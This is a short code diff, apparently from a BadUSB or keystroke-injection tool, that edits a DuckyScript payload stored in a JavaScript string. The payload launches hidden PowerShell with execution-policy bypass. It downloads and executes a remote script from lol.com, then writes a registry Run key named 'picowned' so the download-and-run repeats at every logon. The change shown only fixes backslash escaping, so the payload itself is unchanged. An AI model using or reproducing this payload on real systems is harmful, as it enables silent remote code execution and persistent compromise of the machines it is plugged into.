@@ -511,7 +511,7 @@ ENTER`;
 
 const prS = `GUI r
 DELAY 100
-STRING powershell -W Hidden -EP Bypass -NoP iex (New-Object Net.WebClient).DownloadString("http://lol.com/script.ps1");New-ItemProperty -Path 'HKCU:Software\Microsoft\Windows\CurrentVersionRun\' -Name 'picowned' -Value 'powershell -W hidden -ExecutionPolicy Bypass -NoProfile iex (New-Object Net.WebClient).DownloadString("http://lol.com/script.ps1")' -PropertyType 'String'
+STRING powershell -W Hidden -EP Bypass -NoP iex (New-Object Net.WebClient).DownloadString("http://lol.com/script.ps1");New-ItemProperty -Path 'HKCU:Software\\Microsoft\\Windows\\CurrentVersionRun\\' -Name 'picowned' -Value 'powershell -W hidden -ExecutionPolicy Bypass -NoProfile iex (New-Object Net.WebClient).DownloadString("http://lol.com/script.ps1")' -PropertyType 'String'
 DELAY 200
 ENTER`;         
 
